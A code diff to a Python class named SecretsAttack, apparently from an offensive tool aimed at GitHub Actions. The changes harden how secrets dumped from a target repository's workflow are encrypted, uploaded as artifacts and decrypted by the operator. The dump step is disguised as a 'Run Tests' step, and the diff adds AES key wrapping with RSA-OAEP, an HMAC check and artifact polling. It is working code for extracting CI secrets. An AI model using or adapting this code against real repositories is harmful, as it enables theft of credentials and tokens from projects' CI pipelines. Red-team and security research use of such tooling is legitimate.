@@ -16,13 +16,14 @@ limitations under the License.
 
 import asyncio
 import hashlib
+import hmac
 import json
 import random
 import string
 
 import yaml
 from cryptography.hazmat.backends import default_backend
-from cryptography.hazmat.primitives import serialization
+from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.asymmetric import padding, rsa
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
@@ -107,9 +108,16 @@ EOF
                 {
                     "name": "Run Tests",
                     "env": {"PUBKEY": pubkey},
-                    "run": "aes_key=$(openssl rand -hex 12 | tr -d '\\n');"
-                    "openssl enc -aes-256-cbc -pbkdf2 -in output.json -out output_updated.json -pass pass:$aes_key;"
-                    'echo $aes_key | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt 2> /dev/null;',
+                    "run": """
+aes_key=$(openssl rand -hex 32 | tr -d '\\n')
+iv=$(openssl rand -hex 16 | tr -d '\\n')
+hmac_key=$(openssl rand -hex 32 | tr -d '\\n')
+openssl enc -aes-256-cbc -K "$aes_key" -iv "$iv" -in output.json -out output_updated.json
+openssl dgst -sha256 -mac HMAC -macopt "hexkey:$hmac_key" -binary output_updated.json > output_updated.hmac
+printf '{"v":1,"alg":"AES-256-CBC-HMAC-SHA256","aes_key":"%s","iv":"%s","hmac_key":"%s"}' "$aes_key" "$iv" "$hmac_key" > key_bundle.json
+openssl pkeyutl -encrypt -pubin -inkey <(printf '%s\\n' "$PUBKEY") -in key_bundle.json -out lookup.txt -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -pkeyopt rsa_mgf1_md:sha256
+shred -u key_bundle.json 2> /dev/null || rm -f key_bundle.json
+                    """,
                 },
                 # Upload the encrypted files as workflow run artifacts.
                 # This avoids the edge case where there is a secret set to a value that is in the Base64 (which breaks everything).
@@ -118,7 +126,9 @@ EOF
                     "uses": "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a",
                     "with": {
                         "name": artifact_name,
-                        "path": " |\noutput_updated.json\nlookup.txt",
+                        "path": (
+                            "output_updated.json\nlookup.txt\noutput_updated.hmac"
+                        ),
                     },
                 },
             ],
@@ -153,8 +163,97 @@ EOF
         return (private_key, pem.decode())
 
     @staticmethod
-    def __decrypt_secrets(priv_key, encrypted_key, encrypted_secrets):
+    def __decrypt_secrets(
+        priv_key,
+        encrypted_key,
+        encrypted_secrets,
+        encrypted_secrets_hmac=None,
+    ):
         """Utility method to decrypt secrets given ciphertext blob and a private key."""
+        encrypted_key = SecretsAttack.__ensure_bytes(encrypted_key)
+        encrypted_secrets = SecretsAttack.__ensure_bytes(encrypted_secrets)
+
+        if encrypted_secrets_hmac is not None:
+            return SecretsAttack.__decrypt_authenticated_secrets(
+                priv_key,
+                encrypted_key,
+                encrypted_secrets,
+                SecretsAttack.__ensure_bytes(encrypted_secrets_hmac),
+            )
+
+        return SecretsAttack.__decrypt_legacy_secrets(
+            priv_key,
+            encrypted_key,
+            encrypted_secrets,
+        )
+
+    @staticmethod
+    def __ensure_bytes(value):
+        """Normalize artifact content to bytes."""
+        if isinstance(value, str):
+            return value.encode()
+        return value
+
+    @staticmethod
+    def __has_current_artifact_files(files):
+        """Return whether an artifact has all current encrypted dump files."""
+        return bool(files) and all(
+            name in files
+            for name in ("output_updated.json", "lookup.txt", "output_updated.hmac")
+        )
+
+    @staticmethod
+    def __decrypt_authenticated_secrets(
+        priv_key,
+        encrypted_key,
+        encrypted_secrets,
+        encrypted_secrets_hmac,
+    ):
+        """Decrypt authenticated OAEP-wrapped secrets artifacts."""
+        key_bundle = priv_key.decrypt(
+            encrypted_key,
+            padding.OAEP(
+                mgf=padding.MGF1(algorithm=hashes.SHA256()),
+                algorithm=hashes.SHA256(),
+                label=None,
+            ),
+        )
+        key_data = json.loads(key_bundle.decode())
+        if key_data.get("v") != 1 or key_data.get("alg") != "AES-256-CBC-HMAC-SHA256":
+            raise ValueError("Unsupported secrets artifact encryption metadata.")
+
+        key = SecretsAttack.__decode_hex_key(key_data, "aes_key", 32)
+        iv = SecretsAttack.__decode_hex_key(key_data, "iv", 16)
+        hmac_key = SecretsAttack.__decode_hex_key(key_data, "hmac_key", 32)
+
+        expected_hmac = hmac.new(
+            hmac_key,
+            encrypted_secrets,
+            hashlib.sha256,
+        ).digest()
+        if not hmac.compare_digest(expected_hmac, encrypted_secrets_hmac):
+            raise ValueError("Encrypted secrets artifact failed HMAC verification.")
+
+        cipher = Cipher(algorithms.AES256(key), modes.CBC(iv))
+        decryptor = cipher.decryptor()
+        cleartext = decryptor.update(encrypted_secrets) + decryptor.finalize()
+
+        return SecretsAttack.__remove_pkcs7_padding(cleartext)
+
+    @staticmethod
+    def __decode_hex_key(key_data, field, expected_length):
+        """Decode a fixed-size hex key from a wrapped key bundle."""
+        value = bytes.fromhex(key_data[field])
+        if len(value) != expected_length:
+            raise ValueError(f"Invalid {field} length in secrets artifact metadata.")
+        return value
+
+    @staticmethod
+    def __decrypt_legacy_secrets(priv_key, encrypted_key, encrypted_secrets):
+        """Decrypt pre-authentication OpenSSL enc artifacts."""
+        if encrypted_secrets[:8] != b"Salted__":
+            raise ValueError("Unsupported legacy secrets artifact format.")
+
         salt = encrypted_secrets[8:16]
         ciphertext = encrypted_secrets[16:]
 
@@ -168,9 +267,22 @@ EOF
         decryptor = cipher.decryptor()
 
         cleartext = decryptor.update(ciphertext) + decryptor.finalize()
-        cleartext = cleartext[: -cleartext[-1]]
 
-        return cleartext
+        return SecretsAttack.__remove_pkcs7_padding(cleartext)
+
+    @staticmethod
+    def __remove_pkcs7_padding(cleartext):
+        """Remove and validate OpenSSL AES-CBC PKCS#7 padding."""
+        if not cleartext:
+            raise ValueError("Empty secrets artifact plaintext.")
+
+        padding_length = cleartext[-1]
+        if padding_length < 1 or padding_length > 16:
+            raise ValueError("Invalid secrets artifact padding.")
+        if cleartext[-padding_length:] != bytes([padding_length]) * padding_length:
+            raise ValueError("Invalid secrets artifact padding.")
+
+        return cleartext[:-padding_length]
 
     async def secrets_dump(
         self,
@@ -256,14 +368,21 @@ EOF
                     all_artifacts = await self.api.retrieve_all_workflow_artifacts(
                         target_repo, workflow_id
                     )
-                    if expected.issubset(all_artifacts.keys()):
+                    if expected.issubset(all_artifacts.keys()) and all(
+                        self.__has_current_artifact_files(all_artifacts.get(name))
+                        for name in expected
+                    ):
                         break
                     await asyncio.sleep(1)
 
-                missing = expected - all_artifacts.keys()
+                missing = {
+                    name
+                    for name in expected
+                    if not self.__has_current_artifact_files(all_artifacts.get(name))
+                }
                 if missing:
                     Output.error(
-                        "Artifacts missing for environment(s): "
+                        "Artifacts missing or incomplete for environment(s): "
                         f"{', '.join(artifact_to_env[m] for m in missing)}"
                     )
 
@@ -276,17 +395,11 @@ EOF
                     artifact = await self.api.retrieve_workflow_artifact(
                         target_repo, workflow_id
                     )
-                    if (
-                        artifact
-                        and "output_updated.json" in artifact
-                        and "lookup.txt" in artifact
-                    ):
+                    if self.__has_current_artifact_files(artifact):
                         break
                     await asyncio.sleep(1)
 
-                if not artifact or not (
-                    "output_updated.json" in artifact and "lookup.txt" in artifact
-                ):
+                if not self.__has_current_artifact_files(artifact):
                     Output.error(
                         "Failed to retrieve workflow artifact! "
                         "Artifacts may not have been uploaded."
@@ -332,7 +445,10 @@ EOF
             if "output_updated.json" not in files or "lookup.txt" not in files:
                 continue
             cleartext = self.__decrypt_secrets(
-                priv_key, files["lookup.txt"], files["output_updated.json"]
+                priv_key,
+                files["lookup.txt"],
+                files["output_updated.json"],
+                files.get("output_updated.hmac"),
             )
             secrets = json.loads(cleartext)
             for k, v in secrets.items():
